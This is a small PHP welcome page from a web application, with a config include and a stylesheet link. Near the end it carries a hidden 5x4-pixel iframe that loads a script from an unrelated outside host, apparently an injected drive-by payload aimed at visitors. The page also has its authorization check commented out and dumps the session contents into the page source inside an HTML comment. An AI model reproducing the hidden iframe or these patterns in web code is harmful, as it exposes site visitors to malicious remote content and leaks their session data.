<?php
	include_once('../inc/conf.inc.php');
?>
<html>
<head>
	<title>wellcome</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="../<?php echo CFG_styleDir.CFG_styleFile?>" type="text/css">
</head>

<body>
<?
#authorization('');
?>
<!--<BR>-<br>
CFG_closeOnLogout: <?=CFG_closeOnLogout?"si":"no"?> //<br>
CFG_actionVar: <?=CFG_actionVar?> //<br>
CFG_kickOffTimeOut: <?=CFG_kickOffTimeOut?> //<br>
CFG_refreshTimeOut: <?=CFG_refreshTimeOut?> //<br>
<pre>_SESSION:<br><? var_dump($_SESSION)?></pre>-->
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
